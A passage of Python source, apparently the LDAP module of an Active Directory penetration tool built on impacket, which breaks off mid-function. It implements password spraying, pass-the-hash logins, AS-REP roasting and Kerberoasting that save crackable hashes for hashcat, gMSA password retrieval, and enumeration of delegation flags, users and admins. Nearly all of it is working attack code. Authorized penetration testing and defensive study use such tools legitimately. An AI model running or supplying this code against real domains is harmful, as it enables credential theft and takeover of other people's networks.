#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# from https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
# https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf

import logging
from argparse import _StoreTrueAction
from binascii import b2a_hex, unhexlify, hexlify
from cme.connection import *
from cme.helpers.logger import highlight
from cme.logger import CMEAdapter
from cme.helpers.bloodhound import add_user_bh
from cme.protocols.ldap.gmsa import MSDS_MANAGEDPASSWORD_BLOB
from cme.protocols.ldap.kerberos import KerberosAttacks
from Cryptodome.Hash import MD4
from impacket.smbconnection import SMBConnection, SessionError
from impacket.smb import SMB_DIALECT
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH, UF_TRUSTED_FOR_DELEGATION, UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
from impacket.krb5.kerberosv5 import sendReceive, KerberosError, getKerberosTGT, getKerberosTGS, SessionKeyDecryptionError
from impacket.krb5.types import KerberosTime, Principal, KerberosException
from impacket.ldap import ldap as ldap_impacket
from impacket.krb5 import constants
from impacket.ldap import ldapasn1 as ldapasn1_impacket
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
from io import StringIO
from pywerview.cli.helpers import *
from re import sub, I

ldap_error_status = {
    "1":"STATUS_NOT_SUPPORTED",
    "533":"STATUS_ACCOUNT_DISABLED",
    "701":"STATUS_ACCOUNT_EXPIRED",
    "531":"STATUS_ACCOUNT_RESTRICTION",
    "530":"STATUS_INVALID_LOGON_HOURS",
    "532":"STATUS_PASSWORD_EXPIRED",
    "773":"STATUS_PASSWORD_MUST_CHANGE",
    "775":"USER_ACCOUNT_LOCKED",
    "50":"LDAP_INSUFFICIENT_ACCESS",
    "KDC_ERR_CLIENT_REVOKED":"KDC_ERR_CLIENT_REVOKED",
    "KDC_ERR_PREAUTH_FAILED":"KDC_ERR_PREAUTH_FAILED"
}


def get_conditional_action(baseAction):
    class ConditionalAction(baseAction):
        def __init__(self, option_strings, dest, **kwargs):
            x = kwargs.pop('make_required', [])
            super(ConditionalAction, self).__init__(option_strings, dest, **kwargs)
            self.make_required = x
    
        def __call__(self, parser, namespace, values, option_string=None):
            for x in self.make_required:
                x.required = True
            super(ConditionalAction, self).__call__(parser, namespace, values, option_string)

    return ConditionalAction


class ldap(connection):

    def __init__(self, args, db, host):
        self.domain = None
        self.server_os = None
        self.os_arch = 0
        self.hash = None
        self.ldapConnection = None
        self.lmhash = ''
        self.nthash = ''
        self.baseDN = ''
        self.target = ''
        self.targetDomain = ''
        self.remote_ops = None
        self.bootkey = None
        self.output_filename = None
        self.smbv1 = None
        self.signing = False
        self.smb_share_name = smb_share_name
        self.admin_privs = False
        self.no_ntlm = False
        self.sid_domain = ""

        connection.__init__(self, args, db, host)

    @staticmethod
    def proto_args(parser, std_parser, module_parser):
        ldap_parser = parser.add_parser('ldap', help="own stuff using LDAP", parents=[std_parser, module_parser])
        ldap_parser.add_argument("-H", '--hash', metavar="HASH", dest='hash', nargs='+', default=[], help='NTLM hash(es) or file(s) containing NTLM hashes')
        ldap_parser.add_argument("--no-bruteforce", action='store_true', help='No spray when using file for username and password (user1 => password1, user2 => password2')
        ldap_parser.add_argument("--continue-on-success", action='store_true', help="continues authentication attempts even after successes")
        ldap_parser.add_argument("--port", type=int, choices={389, 636}, default=389, help="LDAP port (default: 389)")
        no_smb_arg = ldap_parser.add_argument("--no-smb", action=get_conditional_action(_StoreTrueAction), make_required=[], help='No smb connection')

        dgroup = ldap_parser.add_mutually_exclusive_group()
        domain_arg = dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, default=None, help="domain to authenticate to")
        dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')
        no_smb_arg.make_required = [domain_arg]
        
        egroup = ldap_parser.add_argument_group("Retrevie hash on the remote DC", "Options to get hashes from Kerberos")
        egroup.add_argument("--asreproast", help="Get AS_REP response ready to crack with hashcat")
        egroup.add_argument("--kerberoasting", help='Get TGS ticket ready to crack with hashcat')
        
        vgroup = ldap_parser.add_argument_group("Retrieve useful information on the domain", "Options to to play with Kerberos")
        vgroup.add_argument("--trusted-for-delegation", action="store_true", help="Get the list of users and computers with flag TRUSTED_FOR_DELEGATION")
        vgroup.add_argument("--password-not-required", action="store_true", help="Get the list of users with flag PASSWD_NOTREQD")
        vgroup.add_argument("--admin-count", action="store_true", help="Get objets that had the value adminCount=1")
        vgroup.add_argument("--users", action="store_true", help="Enumerate enabled domain users")
        vgroup.add_argument("--groups", action="store_true", help="Enumerate domain groups")
        vgroup.add_argument("--gmsa", action="store_true", help="Enumerate GMSA passwords")
        vgroup.add_argument("--get-sid", action="store_true", help="Get domain sid")

        return parser

    def proto_logger(self):
        self.logger = CMEAdapter(extra={
                                        'protocol': "SMB",
                                        'host': self.host,
                                        'port': "445",
                                        'hostname': self.hostname
                                        })

    def get_ldap_info(self, host):
        try:
            ldapConnection = ldap_impacket.LDAPConnection('ldap://%s' % host)

            resp = ldapConnection.search(scope=ldapasn1_impacket.Scope('baseObject'), attributes=['defaultNamingContext', 'dnsHostName'], sizeLimit=0)
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                target = None
                targetDomain = None
                baseDN = None
                try:
                    for attribute in item['attributes']:
                        if str(attribute['type']) == 'defaultNamingContext':
                            baseDN = str(attribute['vals'][0])
                            targetDomain = sub(',DC=', '.', baseDN[baseDN.lower().find('dc='):], flags=I)[3:]
                        if str(attribute['type']) == 'dnsHostName':
                            target = str(attribute['vals'][0])
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.debug('Skipping item, cannot process due to error %s' % str(e))
        except OSError as e:
            return [None, None, None]

        return [target, targetDomain, baseDN]

    def get_os_arch(self):
        try:
            stringBinding = r'ncacn_ip_tcp:{}[135]'.format(self.host)
            transport = DCERPCTransportFactory(stringBinding)
            transport.set_connect_timeout(5)
            dce = transport.get_dce_rpc()
            if self.args.kerberos:
                dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
            dce.connect()
            try:
                dce.bind(MSRPC_UUID_PORTMAP, transfer_syntax=('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
            except (DCERPCException, e):
                if str(e).find('syntaxes_not_supported') >= 0:
                    dce.disconnect()
                    return 32
            else:
                dce.disconnect()
                return 64

        except Exception as e:
            logging.debug('Error retrieving os arch of {}: {}'.format(self.host, str(e)))

        return 0

    def get_ldap_username(self):
        extendedRequest = ldapasn1_impacket.ExtendedRequest()
        extendedRequest['requestName'] = '1.3.6.1.4.1.4203.1.11.3'  # whoami

        response = self.ldapConnection.sendReceive(extendedRequest)
        for message in response:
            searchResult = message['protocolOp'].getComponent()
            if searchResult['resultCode'] == ldapasn1_impacket.ResultCode('success'):
                responseValue = searchResult['responseValue']
                if responseValue.hasValue():
                    value = responseValue.asOctets().decode(responseValue.encoding)[2:]
                    return value.split('\\')[1]
        return ''

    def enum_host_info(self):
        self.target, self.targetDomain, self.baseDN = self.get_ldap_info(self.host)
        self.hostname = self.target
        self.domain = self.targetDomain
        # smb no open, specify the domain
        if self.args.no_smb:
            self.domain = self.args.domain
        else:
            self.local_ip = self.conn.getSMBServer().get_socket().getsockname()[0]

            try:
                self.conn.login('' , '')
            except Exception as e:
                if "STATUS_NOT_SUPPORTED" in str(e):
                    self.no_ntlm = True
                pass
            if not self.no_ntlm:
                self.domain    = self.conn.getServerDNSDomainName()
                self.hostname  = self.conn.getServerName()
            self.server_os = self.conn.getServerOS()
            self.signing   = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection['RequireSigning']
            self.os_arch   = self.get_os_arch()

            self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))
            self.output_filename = self.output_filename.replace(":", "-")

            if not self.domain:
                self.domain = self.hostname

            try:
                '''plaintext_login
                    DC's seem to want us to logoff first, windows workstations sometimes reset the connection
                    (go home Windows, you're drunk)
                '''
                self.conn.logoff()
            except:
                pass

            if self.args.domain:
                self.domain = self.args.domain
            
            if self.args.local_auth:
                self.domain = self.hostname

            #Re-connect since we logged off
            self.create_conn_obj()

    def print_host_info(self):
        if self.args.no_smb:
            self.logger.extra['protocol'] = "LDAP"
            self.logger.extra['port'] = "389"
            self.logger.info(u"Connecting to LDAP {}".format(self.hostname))
            #self.logger.info(self.endpoint)
        else:
            self.logger.extra['protocol'] = "SMB" if not self.no_ntlm else "LDAP"
            self.logger.extra['port'] = "445" if not self.no_ntlm else "389"
            self.logger.info(u"{}{} (name:{}) (domain:{}) (signing:{}) (SMBv1:{})".format(self.server_os,
                                                                                            ' x{}'.format(self.os_arch) if self.os_arch else '',
                                                                                            self.hostname,
                                                                                            self.domain,
                                                                                            self.signing,
                                                                                            self.smbv1))
            self.logger.extra['protocol'] = "LDAP"
            #self.logger.info(self.endpoint)
        return True

    def kerberos_login(self, domain, username, password = '', ntlm_hash = '', aesKey = '', kdcHost = '', useCache = False):
        logging.getLogger("impacket").disabled = True
        self.username = username
        self.password = password
        self.domain = domain

        lmhash = ''
        nthash = ''
        self.username = username
        #This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
            self.hash = nthash
        else:
            nthash = ntlm_hash
            self.hash = ntlm_hash
        if lmhash: self.lmhash = lmhash
        if nthash: self.nthash = nthash

        if self.password == '' and self.args.asreproast:
            hash_TGT = KerberosAttacks(self).getTGT_asroast(self.username)
            if hash_TGT:
                self.logger.highlight(u'{}'.format(hash_TGT))
                with open(self.args.asreproast, 'a+') as hash_asreproast:
                    hash_asreproast.write(hash_TGT + '\n')
            return False

        if not all('' == s for s in [self.nthash, password, aesKey]):
            kerb_pass = next(s for s in [self.nthash, password, aesKey] if s)
        else:
            kerb_pass = ''

        try:
            # Connect to LDAP
            proto = "ldaps" if self.args.gmsa else "ldap"
            self.ldapConnection = ldap_impacket.LDAPConnection(proto + '://%s' % self.target, self.baseDN)
            self.ldapConnection.kerberosLogin(username, password, domain, self.lmhash, self.nthash,
                                                aesKey, kdcHost=kdcHost, useCache=useCache)

            if self.username == '':
                self.username = self.get_ldap_username()

            self.check_if_admin()

            out = u'{}\\{}{} {}'.format(domain,
                                    self.username,
                                    # Show what was used between cleartext, nthash, aesKey and ccache
                                    " from ccache" if useCache
                                    else ":%s" % (kerb_pass if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
                                    highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))

            self.logger.extra['protocol'] = "LDAP"
            self.logger.extra['port'] = "389" if not self.args.gmsa else "636"
            self.logger.success(out)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if not self.args.continue_on_success:
                return True
        except SessionKeyDecryptionError:
            # for PRE-AUTH account
            self.logger.error(u'{}\\{}{} {}'.format(domain,
                                                    self.username,
                                                    " account vulnerable to asreproast attack",
                                                    ""),
                                                    color='yellow')
            return False
        except SessionError as e:
            error, desc = e.getErrorString()
            self.logger.error(u'{}\\{}{} {}'.format(self.domain,
                                                self.username,
                                                " from ccache" if useCache
                                                else ":%s" % (kerb_pass if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
                                                str(error)),
                                                color='magenta' if error in ldap_error_status else 'red')
            return False
        except (KeyError, KerberosException) as e:
            self.logger.error(u'{}\\{}{} {}'.format(self.domain,
                                                self.username,
                                                " from ccache" if useCache
                                                else ":%s" % (kerb_pass if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
                                                str(e)),
                                                color='red')
            return False
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                try:
                    # Connect to LDAPS
                    self.ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % self.target, self.baseDN)
                    self.ldapConnection.kerberosLogin(username, password, domain, self.lmhash, self.nthash,
                                                    aesKey, kdcHost=kdcHost, useCache=useCache)
                
                    if self.username == '':
                        self.username = self.get_ldap_username()

                    self.check_if_admin()

                    # Prepare success credential text
                    out = u'{}\\{}{} {}'.format(domain,
                                            self.username,
                                            " from ccache" if useCache
                                            else ":%s" % (kerb_pass if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
                                            highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))
                    
                    if self.username == '':
                        self.username = self.get_ldap_username()

                    self.check_if_admin()

                    # Prepare success credential text
                    out = u'{}\\{} {}'.format(domain,
                                            self.username,
                                            highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))
                    
                    self.logger.extra['protocol'] = "LDAPS"
                    self.logger.extra['port'] = "636"
                    self.logger.success(out)
                
                    if not self.args.local_auth:
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if not self.args.continue_on_success:
                        return True
                except ldap_impacket.LDAPSessionError as e:
                    errorCode = str(e).split()[-2][:-1]
                    self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                    self.username, 
                                                    self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                    ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
                                                    color='magenta' if errorCode in ldap_error_status else 'red')
                    return False
                except SessionError as e:
                    error, desc = e.getErrorString()
                    self.logger.error(u'{}\\{}{} {}'.format(self.domain,
                                                        self.username,
                                                        " from ccache" if useCache
                                                        else ":%s" % (kerb_pass if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
                                                        str(error)),
                                                        color='magenta' if error in ldap_error_status else 'red')
                    return False
            else:
                errorCode = str(e).split()[-2][:-1]
                self.logger.error(u'{}\\{}{} {}'.format(self.domain,
                                                 self.username,
                                                 " from ccache" if useCache
                                                 else ":%s" % (kerb_pass if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8),
                                                 ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
                                                 color='magenta' if errorCode in ldap_error_status else 'red')
                return False

    def plaintext_login(self, domain, username, password):
        self.username = username
        self.password = password
        self.domain = domain

        if self.password == '' and self.args.asreproast:
            hash_TGT = KerberosAttacks(self).getTGT_asroast(self.username)
            if hash_TGT:
                self.logger.highlight(u'{}'.format(hash_TGT))
                with open(self.args.asreproast, 'a+') as hash_asreproast:
                    hash_asreproast.write(hash_TGT + '\n')
            return False

        try:
            # Connect to LDAP
            proto = "ldaps" if self.args.gmsa else "ldap"
            self.ldapConnection = ldap_impacket.LDAPConnection(proto + '://%s' % self.target, self.baseDN)
            self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            self.check_if_admin()

            # Prepare success credential text
            out = u'{}\\{}:{} {}'.format(domain,
                                     self.username,
                                     self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                     highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))

            self.logger.extra['protocol'] = "LDAP"
            self.logger.extra['port'] = "389" if not self.args.gmsa else "636"
            self.logger.success(out)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if not self.args.continue_on_success:
                return True

        except ldap_impacket.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                # We need to try SSL
                try:
                    # Connect to LDAPS
                    self.ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % self.target, self.baseDN)
                    self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
                    self.check_if_admin()

                    # Prepare success credential text
                    out = u'{}\\{}:{} {}'.format(domain,
                                             self.username,
                                             self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                             highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))
                    self.logger.extra['protocol'] = "LDAPS"
                    self.logger.extra['port'] = "636"
                    self.logger.success(out)

                    if not self.args.local_auth:
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if not self.args.continue_on_success:
                        return True
                except ldap_impacket.LDAPSessionError as e:
                    errorCode = str(e).split()[-2][:-1]
                    self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                    self.username, 
                                                    self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                    ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
                                                    color='magenta' if errorCode and errorCode != 1 in ldap_error_status else 'red')
            else:
                errorCode = str(e).split()[-2][:-1]
                self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                 self.username, 
                                                 self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                 ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
                                                 color='magenta' if errorCode and errorCode != 1 in ldap_error_status else 'red')
            return False

        except OSError as e:
            self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                 self.username, 
                                                 self.password if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                 "Error connecting to the domain, are you sure LDAP service is running on the target ?"))
            return False


    def hash_login(self, domain, username, ntlm_hash):
        self.logger.extra['protocol'] = "LDAP"
        self.logger.extra['port'] = "389"
        lmhash = ''
        nthash = ''

        #This checks to see if we didn't provide the LM Hash
        if ntlm_hash.find(':') != -1:
            lmhash, nthash = ntlm_hash.split(':')
        else:
            nthash = ntlm_hash

        self.hash = ntlm_hash
        if lmhash: self.lmhash = lmhash
        if nthash: self.nthash = nthash

        self.username = username
        self.domain = domain

        if self.hash == '' and self.args.asreproast:
            hash_TGT = KerberosAttacks(self).getTGT_asroast(self.username)
            if hash_TGT:
                self.logger.highlight(u'{}'.format(hash_TGT))
                with open(self.args.asreproast, 'a+') as hash_asreproast:
                    hash_asreproast.write(hash_TGT + '\n')
            return False

        try:
            # Connect to LDAP
            proto = "ldaps" if self.args.gmsa else "ldap"
            self.ldapConnection = ldap_impacket.LDAPConnection(proto + '://%s' % self.target, self.baseDN)
            self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
            self.check_if_admin()
            
            # Prepare success credential text
            out = u'{}\\{}:{} {}'.format(domain,
                                    self.username,
                                    self.nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                    highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))
            self.logger.extra['protocol'] = "LDAP"
            self.logger.extra['port'] = "389" if not self.args.gmsa else "636"
            self.logger.success(out)

            if not self.args.local_auth:
                add_user_bh(self.username, self.domain, self.logger, self.config)
            if not self.args.continue_on_success:
                return True
        except ldap_impacket.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') >= 0:
                try:
                    # We need to try SSL
                    self.ldapConnection = ldap_impacket.LDAPConnection('ldaps://%s' % self.target, self.baseDN)
                    self.ldapConnection.login(self.username, self.password, self.domain, self.lmhash, self.nthash)
                    self.check_if_admin()
                    
                    # Prepare success credential text
                    out = u'{}\\{}:{} {}'.format(domain,
                                            self.username,
                                            self.nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                            highlight('({})'.format(self.config.get('CME', 'pwn3d_label')) if self.admin_privs else ''))
                    self.logger.extra['protocol'] = "LDAPS"
                    self.logger.extra['port'] = "636"
                    self.logger.success(out)
            
                    if not self.args.local_auth:
                        add_user_bh(self.username, self.domain, self.logger, self.config)
                    if not self.args.continue_on_success:
                        return True
                except ldap_impacket.LDAPSessionError as e:
                    errorCode = str(e).split()[-2][:-1]
                    self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                    self.username, 
                                                    nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                    ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
                                                    color='magenta' if errorCode and errorCode != 1 in ldap_error_status else 'red')
            else:
                errorCode = str(e).split()[-2][:-1]
                self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                 self.username, 
                                                 nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                 ldap_error_status[errorCode] if errorCode in ldap_error_status else ''),
                                                 color='magenta' if errorCode and errorCode != 1 in ldap_error_status else 'red')
            return False
        except OSError as e:
            self.logger.error(u'{}\\{}:{} {}'.format(self.domain, 
                                                 self.username, 
                                                 nthash if not self.config.get('CME', 'audit_mode') else self.config.get('CME', 'audit_mode')*8,
                                                 "Error connecting to the domain, are you sure LDAP service is running on the target ?"))
            return False

    def create_smbv1_conn(self):
        try:
            self.conn = SMBConnection(self.host, self.host, None, 445, preferredDialect=SMB_DIALECT)
            self.smbv1 = True
        except socket.error as e:
            if str(e).find('Connection reset by peer') != -1:
                logging.debug('SMBv1 might be disabled on {}'.format(self.host))
            return False
        except Exception as e:
            logging.debug('Error creating SMBv1 connection to {}: {}'.format(self.host, e))
            return False

        return True

    def create_smbv3_conn(self):
        try:
            self.conn = SMBConnection(self.host, self.host, None, 445)
            self.smbv1 = False
        except socket.error:
            return False
        except Exception as e:
            logging.debug('Error creating SMBv3 connection to {}: {}'.format(self.host, e))
            return False

        return True

    def create_conn_obj(self):
        if not self.args.no_smb:
            if self.create_smbv1_conn():
                return True
            elif self.create_smbv3_conn():
                return True
            return False
        else:
            return True

    def get_sid(self):
        self.logger.highlight('Domain SID {}'.format(self.sid_domain))

    def sid_to_str(self, sid):

        try:
            # revision
            revision = int(sid[0])
            # count of sub authorities
            sub_authorities = int(sid[1])
            # big endian
            identifier_authority = int.from_bytes(sid[2:8], byteorder='big')
            # If true then it is represented in hex
            if identifier_authority >= 2 ** 32:
                identifier_authority = hex(identifier_authority)

            # loop over the count of small endians
            sub_authority = '-' + '-'.join([str(int.from_bytes(sid[8 + (i * 4): 12 + (i * 4)], byteorder='little')) for i in range(sub_authorities)])
            objectSid = 'S-' + str(revision) + '-' + str(identifier_authority) + sub_authority

            return objectSid
        except Exception:
            pass

        return sid

    def check_if_admin(self):

        # 1. get SID of the domaine
        searchFilter = "(userAccountControl:1.2.840.113556.1.4.803:=8192)"
        attributes= ["objectSid"]
        resp = self.search(searchFilter, attributes,  sizeLimit=0)
        answers = []
        if resp and self.password != '' and self.username != '':
            for attribute in resp[0][1]:
                if str(attribute['type']) == 'objectSid':
                    sid = self.sid_to_str(attribute['vals'][0])
                    self.sid_domain = '-'.join(sid.split('-')[:-1])

            # 2. get all group cn name
            searchFilter = "(|(objectSid="+self.sid_domain+"-512)(objectSid="+self.sid_domain+"-544)(objectSid="+self.sid_domain+"-519)(objectSid=S-1-5-32-549)(objectSid=S-1-5-32-551))"
            attributes= ["distinguishedName"]
            resp = self.search(searchFilter, attributes,  sizeLimit=0)
            answers = []
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'distinguishedName':
                        answers.append(str("(memberOf:1.2.840.113556.1.4.1941:=" + attribute['vals'][0] + ")"))

            # 3. get memeber of these groups
            searchFilter = "(&(objectCategory=user)(sAMAccountName=" + self.username + ")(|" + ''.join(answers) + "))"
            attributes= [""]
            resp = self.search(searchFilter, attributes,  sizeLimit=0)
            answers = []
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                if item:
                    self.admin_privs = True

    def getUnixTime(self, t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def search(self, searchFilter, attributes, sizeLimit=0):
        try:
            if self.ldapConnection:
                logging.debug('Search Filter=%s' % searchFilter)
                resp = self.ldapConnection.search(searchFilter=searchFilter,
                                                    attributes=attributes,
                                                    sizeLimit=sizeLimit)
                return resp 
        except ldap_impacket.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                self.logger.error('sizeLimitExceeded exception caught, giving up and processing the data received')
                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
                # paged queries
                resp = e.getAnswers()
                pass
            else:
                self.logger.error(e)
                return False
        return False

    def users(self):
        # Building the search filter
        searchFilter = "(sAMAccountType=805306368)"
        attributes= ['sAMAccountName', 'description', 'badPasswordTime', 'badPwdCount', 'pwdLastSet']
        resp = self.search(searchFilter, attributes,  sizeLimit=0)
        if resp:
            answers = []
            self.logger.info('Total of records returned %d' % len(resp))
            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                sAMAccountName =  ''
                badPasswordTime = ''
                badPwdCount = 0
                description = ''
                pwdLastSet = ''
                try:
                    for attribute in item['attributes']:
                        if str(attribute['type']) == 'sAMAccountName':
                            sAMAccountName = str(attribute['vals'][0])
                        elif str(attribute['type']) == 'description':
                            description = str(attribute['vals'][0])
                    self.logger.highlight('{:<30} {}'.format(sAMAccountName, description))
                except Exception as e:
                    self.logger.debug('Skipping item, cannot process due to error %s' % str(e))
                    pass
            return

    def groups(self):
        # Building the search filter
        searchFilter = "(objectCategory=group)"
        attributes=['name']
        resp = self.search(searchFilter, attributes, 0)
        if resp:
            answers = []
            logging.debug('Total of records returned %d' % len(resp))

            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                name =  ''
                try:
                    for attribute in item['attributes']:
                        if str(attribute['type']) == 'name':
                            name = str(attribute['vals'][0])
                    self.logger.highlight('{}'.format(name))
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.debug('Skipping item, cannot process due to error %s' % str(e))
                    pass
            return       

    def asreproast(self):
        if self.password == '' and self.nthash == '' and self.kerberos == False:
            return False
        # Building the search filter
        searchFilter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)" \
                    "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % \
                    (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)
        attributes = ['sAMAccountName', 'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon']
        resp = self.search(searchFilter, attributes, 0)
        if resp == []:
            self.logger.highlight("No entries found!")
        elif resp:
            answers = []
            self.logger.info('Total of records returned %d' % len(resp))

            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                mustCommit = False
                sAMAccountName =  ''
                memberOf = ''
                pwdLastSet = ''
                userAccountControl = 0
                lastLogon = 'N/A'
                try:
                    for attribute in item['attributes']:
                        if str(attribute['type']) == 'sAMAccountName':
                            sAMAccountName = str(attribute['vals'][0])
                            mustCommit = True
                        elif str(attribute['type']) == 'userAccountControl':
                            userAccountControl = "0x%x" % int(attribute['vals'][0])
                        elif str(attribute['type']) == 'memberOf':
                            memberOf = str(attribute['vals'][0])
                        elif str(attribute['type']) == 'pwdLastSet':
                            if str(attribute['vals'][0]) == '0':
                                pwdLastSet = '<never>'
                            else:
                                pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                        elif str(attribute['type']) == 'lastLogon':
                            if str(attribute['vals'][0]) == '0':
                                lastLogon = '<never>'
                            else:
                                lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    if mustCommit is True:
                        answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.debug('Skipping item, cannot process due to error %s' % str(e))
                    pass
            if len(answers)>0:
                for user in answers:
                    hash_TGT = KerberosAttacks(self).getTGT_asroast(user[0])
                    self.logger.highlight(u'{}'.format(hash_TGT))
                    with open(self.args.asreproast, 'a+') as hash_asreproast:
                        hash_asreproast.write(hash_TGT + '\n')
                return True
            else:
                self.logger.highlight("No entries found!")
                return
        else:
            self.logger.error("Error with the LDAP account used")

    def kerberoasting(self):
        # Building the search filter
        searchFilter = "(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)" \
                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer)))"
        attributes = ['servicePrincipalName', 'sAMAccountName', 'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon']
        resp = self.search(searchFilter, attributes, 0)
        if resp == []:
            self.logger.highlight("No entries found!")
        elif resp:
            answers = []

            for item in resp:
                if isinstance(item, ldapasn1_impacket.SearchResultEntry) is not True:
                    continue
                mustCommit = False
                sAMAccountName =  ''
                memberOf = ''
                SPNs = []
                pwdLastSet = ''
                userAccountControl = 0
                lastLogon = 'N/A'
                delegation = ''
                try:
                    for attribute in item['attributes']:
                        if str(attribute['type']) == 'sAMAccountName':
                            sAMAccountName = str(attribute['vals'][0])
                            mustCommit = True
                        elif str(attribute['type']) == 'userAccountControl':
                            userAccountControl = str(attribute['vals'][0])
                            if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                                delegation = 'unconstrained'
                            elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                                delegation = 'constrained'
                        elif str(attribute['type']) == 'memberOf':
                            memberOf = str(attribute['vals'][0])
                        elif str(attribute['type']) == 'pwdLastSet':
                            if str(attribute['vals'][0]) == '0':
                                pwdLastSet = '<never>'
                            else:
                                pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                        elif str(attribute['type']) == 'lastLogon':
                            if str(attribute['vals'][0]) == '0':
                                lastLogon = '<never>'
                            else:
                                lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                        elif str(attribute['type']) == 'servicePrincipalName':
